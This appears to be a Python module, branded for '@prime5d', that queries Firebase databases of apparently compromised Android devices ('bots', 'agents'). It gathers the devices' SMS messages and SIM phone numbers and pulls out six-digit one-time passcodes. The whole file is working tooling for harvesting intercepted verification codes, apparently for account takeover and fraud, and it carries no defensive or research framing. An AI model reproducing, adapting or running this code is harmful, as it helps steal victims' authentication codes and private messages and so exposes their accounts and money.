#!/usr/bin/env python3
"""
Firebase Interaction Module
Branded for @prime5d
"""
import asyncio
import re
import httpx
from typing import Any, List, Dict, Tuple, Optional
from dataclasses import dataclass

# Firebase Path Candidates (from original logic)
DEVICE_PATH_KEYS = ("All_User", "all_user", "All_Users", "bots", "devices", "users", "clients", "agents")
MESSAGE_PATH_KEYS = ("messages", "sms", "user_sms", "allMessages", "inbox", "logs", "message", "msg")
MESSAGE_BODY_KEYS = ("body", "message", "text", "msg", "content", "sms", "desc")
SENDER_KEYS = ("address", "sender", "from", "to", "phone", "number", "mobile", "mobNo", "senderNumber")
TIME_KEYS = ("timestamp", "time", "date", "createdAt", "receivedAt", "msgTime", "times", "pushTime")
PHONE_FIELD_KEYS = ("mobNo", "mobileNumber", "phoneNumber", "mobile", "phone", "number", "mno", "contact", "sim", "sim1", "sim2", "simNo", "simNumber")
ONLINE_KEYS = ("online", "isOnline", "active", "is_active", "on_off", "state", "status", "Status")

@dataclass
class SimInfo:
    slot: int
    digits: str
    carrier: str = ""

@dataclass
class Device:
    db: str
    path: str
    id: str
    name: str
    online: Optional[bool]
    sims: List[SimInfo]
    
    @property
    def primary_phone(self) -> str:
        for s in self.sims:
            if s.digits: return s.digits
        return ""
        
    def phone_for_sim(self, slot: str) -> str:
        s_idx = int(slot)
        for s in self.sims:
            if s.slot == s_idx: return s.digits
        return ""

class FirebaseClient:
    def __init__(self, client: httpx.AsyncClient, project: Any, max_response_bytes: int = 16*1024*1024):
        self.client = client
        self.project = project
        self.max_response_bytes = max_response_bytes

    async def get(self, path: str, shallow: bool = False) -> Any:
        params = {}
        if self.project.token: params["auth"] = self.project.token
        if shallow: params["shallow"] = "true"
        url = f"{self.project.url.rstrip('/')}/{path}.json"
        r = await self.client.get(url, params=params)
        if r.status_code == 401: raise Exception("Permission Denied")
        r.raise_for_status()
        return r.json()

@dataclass
class FirebaseProject:
    url: str
    token: str = ""
    label: str = ""

def parse_projects(specs: List[str], global_token: str = "") -> List[FirebaseProject]:
    projects = []
    for spec in specs:
        for line in spec.splitlines():
            line = line.strip()
            if not line: continue
            parts = [p.strip() for p in line.split("|")]
            url = parts[0]
            if not url.startswith("http"): url = f"https://{url}"
            token = parts[1] if len(parts) > 1 else global_token
            label = parts[2] if len(parts) > 2 else url.split("//")[1].split(".")[0]
            projects.append(FirebaseProject(url, token, label))
    return projects

async def discover_message_paths(client: FirebaseClient, devices_path: str = "") -> List[str]:
    found = []
    try: root = await client.get("", shallow=True)
    except: return []
    
    root_keys = list(root) if isinstance(root, dict) else []
    for key in MESSAGE_PATH_KEYS:
        if key in root_keys: found.append(key)
    
    if devices_path:
        try:
            raw_devices = await client.get(devices_path)
            if isinstance(raw_devices, dict):
                for key, value in list(raw_devices.items())[:3]:
                    if isinstance(value, dict):
                        for mkey in MESSAGE_PATH_KEYS:
                            if mkey in value: found.append(f"{devices_path}/{key}/{mkey}")
        except: pass
    return list(dict.fromkeys(found))

@dataclass
class Message:
    db: str
    path: str
    device_id: str
    id: str
    sender: str
    body: str
    timestamp: Any
    sort_timestamp: int
    
    @property
    def otp(self) -> Optional[str]:
        return extract_otp(self.body)

async def collect_messages(client: FirebaseClient, path: str = "") -> List[Message]:
    raw = await client.get(path)
    if not raw: return []
    messages = []
    db_url = client.project.url
    
    def normalize(key, data):
        if isinstance(data, str): data = {"body": data}
        if not isinstance(data, dict): return None
        body = ""
        for k in MESSAGE_BODY_KEYS:
            if k in data: 
                body = str(data[k])
                break
        if not body: body = str(key)
        
        ts = 0
        raw_ts = 0
        for k in TIME_KEYS:
            if k in data:
                raw_ts = data[k]
                try:
                    ts = int(str(raw_ts))
                    if ts > 10**10: ts //= 1000
                except: ts = 0
                break
        
        sender = ""
        for k in SENDER_KEYS:
            if k in data:
                sender = str(data[k])
                break
                
        return Message(db=db_url, path=path, device_id="", id=str(key), sender=sender, body=body, timestamp=raw_ts, sort_timestamp=ts)

    if isinstance(raw, dict):
        for k, v in raw.items():
            m = normalize(k, v)
            if m: messages.append(m)
    elif isinstance(raw, list):
        for i, v in enumerate(raw):
            m = normalize(i, v)
            if m: messages.append(m)
            
    messages.sort(key=lambda x: x.sort_timestamp, reverse=True)
    return messages

def latest_otps(messages: List[Message], mobile: str = "", limit: int = 5) -> List[Tuple[int, str, Message]]:
    seen = set()
    out = []
    for m in messages:
        otp = m.otp
        if not otp or otp in seen: continue
        score = m.sort_timestamp
        # Bonus score if sender matches mobile
        if mobile and mobile in m.sender: score += 10**7
        seen.add(otp)
        out.append((score, otp, m))
    out.sort(key=lambda x: x[0], reverse=True)
    return out[:limit]

async def collect_devices(fb: FirebaseClient, path: str) -> Tuple[str, List[Device]]:
    raw = await fb.get(path)
    devices = []
    if not isinstance(raw, dict): return path, []
    
    for dev_id, data in raw.items():
        if not isinstance(data, dict): continue
        sims = []
        for i in range(1, 3):
            num = None
            for k in PHONE_FIELD_KEYS:
                if k == "mobile" or k == "phone":
                    if f"{k}{i}" in data: num = data[f"{k}{i}"]
                elif k in data: num = data[k]
            if num: sims.append(SimInfo(slot=i, digits=str(num)))
            
        devices.append(Device(
            db=fb.project.url, path=f"{path}/{dev_id}", id=dev_id,
            name=str(data.get("model") or data.get("name") or dev_id),
            online=data.get("online"), sims=sims
        ))
    return path, devices

def extract_otp(text: str) -> Optional[str]:
    if not text: return None
    match = re.search(r"(?i)maccaron.*?\b(\d{6})\b", text)
    if match: return match.group(1)
    match = re.search(r"(?<!\d)(\d{6})(?!\d)", text)
    if match: return match.group(1)
    return None
